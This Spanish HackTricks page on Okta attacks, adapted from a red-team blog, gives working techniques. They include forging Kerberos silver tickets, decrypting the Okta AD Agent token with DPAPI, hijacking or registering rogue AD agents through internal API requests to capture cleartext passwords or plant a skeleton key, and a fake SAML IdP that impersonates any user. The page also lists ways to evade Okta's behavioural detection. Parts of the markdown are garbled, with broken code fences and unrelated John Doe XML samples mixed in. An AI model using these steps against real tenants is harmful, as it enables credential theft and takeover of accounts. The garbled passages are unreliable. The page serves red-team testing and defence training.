# Seguridad en Okta

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci칩n B치sica

Okta, Inc. es una **empresa de gesti칩n de identidad y acceso** que proporciona software en la nube para ayudar a las empresas a **gestionar y asegurar la autenticaci칩n de usuarios en aplicaciones modernas**, y para que los desarrolladores integren controles de identidad en aplicaciones, servicios web de sitios web y dispositivos.

Su servicio principal, llamado Okta Identity Cloud, ofrece productos que incluyen inicio de sesi칩n 칰nico (SSO), autenticaci칩n multifactor (MFA), gesti칩n del ciclo de vida, directorio universal, gesti칩n de acceso a API y m치s. Esto ayuda a las empresas a proteger sus datos sensibles y tambi칠n a simplificar el acceso de los usuarios, haciendo que las aplicaciones y servicios sean m치s accesibles y f치ciles de usar para empleados o clientes.

Los servicios de Okta son ampliamente utilizados en contextos empresariales, as칤 como por empresas m치s peque침as y desarrolladores. Juega un papel crucial en la habilitaci칩n de las empresas para adoptar y gestionar de manera segura las tecnolog칤as en la nube. Hasta mi 칰ltima actualizaci칩n de conocimientos en septiembre de 2021, Okta sigue siendo un actor importante en la industria de Gesti칩n de Identidad y Acceso (IAM).

{% hint style="danger" %}
El principal objetivo de Okta es configurar el acceso a diferentes usuarios y grupos a aplicaciones externas. Si logras **comprometer los privilegios de administrador en un entorno de Okta**, con alta probabilidad podr치s **comprometer todas las otras plataformas que la empresa est치 utilizando**.
{% endhint %}

{% hint style="success" %}
Para realizar una revisi칩n de seguridad de un entorno Okta, debes solicitar **acceso de solo lectura de administrador**.
{% endhint %}

### Resumen

Hay **usuarios** (que pueden estar **almacenados en Okta**, registrados desde **Proveedores de Identidad** configurados o autenticados a trav칠s de **Active Directory** o LDAP).\
Estos usuarios pueden estar dentro de **grupos**.\
Tambi칠n hay **autenticadores**: diferentes opciones para autenticarse como contrase침a, y varios 2FA como WebAuthn, correo electr칩nico, tel칠fono, okta verify (pueden estar habilitados o deshabilitados)...

Luego, hay **aplicaciones** sincronizadas con Okta. Cada aplicaci칩n tendr치 alg칰n **mapeo con Okta** para compartir informaci칩n (como direcciones de correo electr칩nico, nombres de pila...). Adem치s, cada aplicaci칩n debe estar dentro de una **Pol칤tica de Autenticaci칩n**, que indica los **autenticadores necesarios** para que un usuario **acceda** a la aplicaci칩n.

{% hint style="danger" %}
El rol m치s poderoso es **Super Administrador**.

Si un atacante compromete Okta con acceso de Administrador, todas las **aplicaciones que conf칤an en Okta** ser치n con alta probabilidad **comprometidas**.
{% endhint %}

## Ataques

### Localizar el Portal de Okta

Normalmente, el portal de una empresa estar치 ubicado en **companyname.okta.com**. Si no, intenta **variaciones simples** de **companyname.** Si no lo encuentras, tambi칠n es posible que la organizaci칩n tenga un registro **CNAME** como **`okta.companyname.com`** apuntando al **portal de Okta**.

### Iniciar sesi칩n en Okta v칤a Kerberos

(Ataque copiado [**de aqu칤**](https://trustedsec.com/blog/okta-for-red-teamers)).

Si existe un dominio como **`companyname.kerberos.okta.com`**, entonces kerberos est치 configurado dentro de la empresa para acceder a Okta. Esto es muy interesante ya que normalmente los usuarios de Windows no necesitar치n MFA para acceder a Okta.

Tambi칠n es posible encontrar usuarios de Kerberos configurados con acceso a Okta dentro del entorno de AD ejecutando:
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
Con un ticket recuperado para el usuario de AD, necesitamos inyectarlo en un host que controlemos usando Rubeus o Mimikatz:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Deber치s asegurarte de que `clientname.kerberos.okta.com` est칠 a침adido a la zona de seguridad "Intranet" en Opciones de Internet. Luego, en nuestro navegador, si accedemos a la siguiente URL, deber칤amos recibir una respuesta JSON que proporciona un resultado `OK` cuando se acepta el ticket de Kerberos:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dirigi칠ndote al panel de control de Okta, si todo est치 bien, habr치s iniciado sesi칩n.

Adem치s, si somos capaces de comprometer la cuenta de servicio de Okta que expone el SPN de delegaci칩n, podemos realizar un ataque de Silver Ticket.

Cabe se침alar que, como Okta solo admite AES para la encriptaci칩n de tickets, necesitaremos asegurarnos de tener la clave AES o la contrase침a en texto plano para autenticarnos:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Para crear nuestro ticket para el usuario v칤ctima `testuser`, usamos:

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
```markdown
{% endcode %}

Y nuevamente, entregamos esto a Okta a trav칠s de nuestra sesi칩n de navegador:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Secuestro del Agente AD de Okta

(Ataque copiado [**de aqu칤**](https://trustedsec.com/blog/okta-for-red-teamers)).

Si accedes a un servidor que ejecuta el Agente AD de Okta. Este agente es responsable de sincronizar usuarios y grupos del dominio con Okta para la provisi칩n, y tambi칠n de responder a solicitudes de autenticaci칩n de Okta cuando los usuarios inician sesi칩n en el portal.

Por defecto, el agente se instala en:
```
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
Vamos a echar un vistazo al `OktaAgentService.exe.config`, que contiene algunos fragmentos interesantes de XML:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

El `AgentToken` codificado en Base64 es donde ponemos nuestra atenci칩n. Si abrimos `OktaAgentService.exe` en dnSpy, podemos ver c칩mo se descifran estos valores:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As칤 es... 춰el buen viejo DPAPI! El valor de `RandomEntropy` se establece en:

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Esto significa que podemos descifrar este valor de XML codificado en Base64 utilizando:
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
La clave maestra DPAPI utilizada pertenece a la cuenta de usuario que ejecuta el servicio "Okta AD Agent", por lo que necesitar치s ejecutar lo anterior en el contexto de la cuenta de servicio, o capturar la clave maestra para la cuenta y descifrar:

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por ejemplo, dentro de `OktaAgentService.exe.config` tenemos dos campos XML adicionales, `APPID` y `AGENTID`. Combinados con el `AgentToken`, podemos realizar una solicitud `GET` de la siguiente manera:
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
Esta llamada se bloquear치 hasta que un usuario se autentique en Okta (o la solicitud expire), en cuyo caso devolver치 el siguiente nombre de usuario y contrase침a proporcionados en texto claro:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
Mientras esto permite capturar credenciales, tambi칠n tenemos la oportunidad de responder a este intento de autenticaci칩n si queremos hacer algo como proporcionar una llave maestra. Hacemos esto emitiendo la siguiente solicitud HTTP:
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
El resultado de emitir esta solicitud es permitir la autenticaci칩n para cualquier usuario a trav칠s de Okta.

### Secuestro de AD como Administrador

(Ataque copiado [**de aqu칤**](https://trustedsec.com/blog/okta-for-red-teamers)).

Sabemos que podemos secuestrar un Agente de AD de Okta utilizando un Token de Agente robado, pero 쯤u칠 pasa si hemos comprometido una cuenta privilegiada de Okta y queremos hacer esto sin un token de agente existente? Veamos c칩mo hacerlo.

Primero, necesitamos crear un token de API para el Agente de AD de Okta. Para iniciar el flujo de autenticaci칩n, necesitamos un C칩digo OAuth. Para obtenerlo, comenzamos dirigi칠ndonos a:

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
```markdown
{% endcode %}

Esto te presentar치 un mensaje de permiso para que aceptes:

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Aceptar el mensaje presentado te redirigir치 a `/oauth-response` junto con un par치metro `code`:

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

Necesitamos tomar este par치metro `code` y solicitar un token de API usando la solicitud POST:
```
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
La respuesta nos devuelve nuestro token de API:
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
Usando este token, necesitamos asociarlo con un dominio AD activo. Hacemos esto utilizando la llamada a la API:
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
Esto nos devolver치 la siguiente respuesta XML, donde necesitamos retener el valor del atributo `id` para m치s adelante
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
A continuaci칩n, realizamos una llamada a la API HTTP para nombrar nuestro conector:
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
```xml
<user id="12345">
  <name>John Doe</name>
  <email>johndoe@example.com</email>
</user>
```
{% endcode %}

Esto devolver치 una respuesta XML donde, nuevamente, necesitamos retener el atributo `id`:

{% code overflow="wrap" %}
```xml
<usuario id="12345">
  <nombre>John Doe</nombre>
  <correo>johndoe@example.com</correo>
</usuario>
```
{% endcode %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
```markdown
Finalmente, inicializamos la conexi칩n para permitir la recepci칩n de datos:
```
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
Con esto hecho, nuestro falso agente de AD est치 listo y procesar치 los intentos de autenticaci칩n como se mostr칩 anteriormente.

Ahora, obviamente no queremos estar haciendo todo esto usando Burp, por lo que se ha creado una herramienta para soportar algunos casos de uso. Esta est치 disponible [aqu칤](https://github.com/xpn/OktaPostExToolkit).

El primer modo en el que podemos ejecutar esta herramienta es en modo `token`, que toma un valor de Token de Agente comprometido y se conectar치 a la API de Okta, volcando cualquier credencial que reciba:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
Ejemplos de video:

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

La herramienta tambi칠n permite registrar un nuevo conector de AD si tenemos credenciales administrativas disponibles para un usuario de Okta que est칠 utilizando:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Proveedor Falso de SAML de Okta

(Ataque copiado [**de aqu칤**](https://trustedsec.com/blog/okta-for-red-teamers)).

Otra t칠cnica que ha sido muy 칰til durante las evaluaciones es el despliegue de un proveedor falso de SAML.

Recientemente, Okta proporcion칩 [una actualizaci칩n de seguridad](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection) sobre ataques en el mundo real utilizando esta t칠cnica, por lo que es ciertamente 칰til conocer esto al simular actividad en un entorno, especialmente para clientes que desean probar sus detecciones de este ataque particular.

Si tenemos acceso a una cuenta de Okta con privilegios elevados, podemos desplegar un Proveedor de Identidad externo como parte de la funcionalidad de Okta. Esto permite que proveedores externos como Entra ID completen la autenticaci칩n antes de redirigir al usuario a Okta para seleccionar aplicaciones integradas.

Pero, 쯤u칠 pasa si controlamos el IDP? Bueno, es l칩gico pensar que en este caso, podemos aprobar cualquier solicitud de autenticaci칩n que queramos.

Para probar esto, necesitamos un Proveedor de Identidad personalizado para desplegar. Un IDP de SAML muy rudimentario que apoya nuestras actividades nefastas se puede encontrar [aqu칤](https://github.com/xpn/OktaPostExToolkit). La idea principal detr치s de esta herramienta es permitirnos emitir respuestas de autenticaci칩n SAML firmadas que correspondan a cualquier usuario que queramos.

Este servidor escuchar치 las solicitudes HTTP entrantes en `/saml`, por lo que primero necesitamos desplegar un IDP en Okta.

Primero, seleccionamos el IDP de SAML 2.0:

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al configurar el IDP, necesitamos prestar atenci칩n a algunas configuraciones. La primera es el `Name`, que es el nombre amigable que se mostrar치 a cualquier otro administrador de Okta.

Luego est치 la URL del emisor, que debe establecerse en el valor de un identificador en formato URI. Esto nuevamente puede ser cualquier cosa, pero usaremos `https://www.example.com/`.

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Tambi칠n necesitamos establecer el campo `IdP Single Sign-On URL` en la ubicaci칩n donde nuestro servidor SAML est치 en funcionamiento. Ahora, lo interesante es que esta URL NO necesita apuntar a nuestro servidor. Siento que vale la pena se침alar esto porque podemos ser bastante creativos en la URL que ingresamos aqu칤 y hacer el trabajo del Equipo Azul un poco m치s dif칤cil. Por ejemplo, podemos establecer este campo en algo como `https://idp.google.com/saml` si queremos, y lo 칰nico que necesitamos poder hacer es capturar la solicitud SAML entrante. Aqu칤 est치 lo interesante: la solicitud SAML se reenv칤a del lado del cliente. Con eso, quiero decir que Okta generar치 la `AuthRequest` de SAML y har치 que nuestro navegador se redirija a `https://idp.google.com/` junto con la solicitud SAML. Esto, por supuesto, significa que podemos modificar el archivo de hosts local para apuntar `idp.google.com` a `127.0.0.1`:
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
Tambi칠n necesitamos un certificado de firma que controlemos. Puede ser autofirmado y generado usando OpenSSL con:

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

Una vez m치s, puedes ser creativo con esto, ya que no hay requisitos espec칤ficos en torno a la autenticidad de este certificado.

Una vez generado el clave, simplemente subimos el certificado a Okta y creamos nuestro IDP.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Finalmente, necesitamos asegurarnos de que `Match Against` est칠 configurado como `Okta Username or Email` y `Account Link Policy` est칠 configurado como `Automatic` para permitirnos autenticarnos en cuentas de Okta existentes:

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Con todo guardado, necesitamos descargar los Metadatos:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Luego, para iniciar la solicitud de autenticaci칩n y emitir el `AuthRequest`, navegamos a la URL mostrada en `Assertion Consumer Service URL`:

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Navegar a esta URL resulta en una redirecci칩n a nuestro servidor SAML interno:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Si proporcionamos una direcci칩n de correo electr칩nico, descubrimos que podemos autenticarnos como cualquier usuario de Okta sin necesidad de conocer sus credenciales.

Veamos esto en acci칩n en [https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)

### Phishing Okta Portal con Evilgnix

En [**este post del blog**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23) se explica c칩mo preparar una campa침a de phishing contra un portal de Okta.

### Ataque de Suplantaci칩n de Colega

Los **atributos que cada usuario puede tener y modificar** (como el correo electr칩nico o el nombre) pueden configurarse en Okta. Si una **aplicaci칩n** est치 **confiando** en un **atributo** que el usuario puede **modificar** como ID, podr치 **suplantar a otros usuarios en esa plataforma**.

Por lo tanto, si la aplicaci칩n conf칤a en el campo **`userName`**, probablemente no podr치s cambiarlo (porque normalmente no puedes cambiar ese campo), pero si conf칤a por ejemplo en **`primaryEmail`** podr칤as ser capaz de **cambiarlo al correo electr칩nico de un colega** y suplantarlo (necesitar치s tener acceso al correo electr칩nico y aceptar el cambio).

Ten en cuenta que esta suplantaci칩n depende de c칩mo cada aplicaci칩n est칠 configurada. Solo las que conf칤en en el campo que modificaste y acepten actualizaciones estar치n comprometidas.\
Por lo tanto, la aplicaci칩n deber칤a tener este campo habilitado si existe:

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

Tambi칠n he visto otras aplicaciones que eran vulnerables pero no ten칤an ese campo en la configuraci칩n de Okta (al final diferentes aplicaciones est치n configuradas de manera diferente).

춰La mejor manera de averiguar si podr칤as suplantar a alguien en cada aplicaci칩n ser칤a intentarlo!

## Evadiendo pol칤ticas de detecci칩n de comportamiento <a href="#9fde" id="9fde"></a>

A menos que se haya divulgado de antemano, probablemente no sabr치s si se han implementado pol칤ticas de detecci칩n de comportamiento hasta que te encuentres con ellas. Una **forma potencial de eludir las pol칤ticas de detecci칩n de comportamiento de Okta** es simplemente **evitar el panel principal de Okta** por completo y dirigirse directamente a las aplicaciones de Okta (estas ser칤an las aplicaciones en la captura de pantalla anterior que est치n oscurecidas por cajas rojas). Si est치s en posesi칩n de un token de acceso de Okta, en lugar de reutilizar el token en la p치gina principal de inicio de sesi칩n de Okta de tu empresa objetivo, reutilizar칤as el token en la URL espec칤fica de la aplicaci칩n de Okta.

Otras recomendaciones son:

* Ten cuidado al reutilizar tokens de acceso capturados desde proxies anonimizadores populares y servicios VPN.
* Al reutilizar un token de acceso, usa la misma cadena de agente de usuario utilizada por el cliente.
* Ten cuidado al reutilizar tokens de acceso capturados de diferentes usuarios desde la misma direcci칩n IP.
* Ten cuidado al reutilizar tokens de acceso contra el panel de Okta.
* Si conoces las direcciones IP de la empresa que las v칤ctimas estar치n utilizando, considera bloquear todo el tr치fico que no sea de esa IP o rango de IP.

## Fortalecimiento de Okta

Okta tiene muchas configuraciones posibles, en esta p치gina encontrar치s c칩mo revisarlas para que sean lo m치s seguras posible:

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## Referencias

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
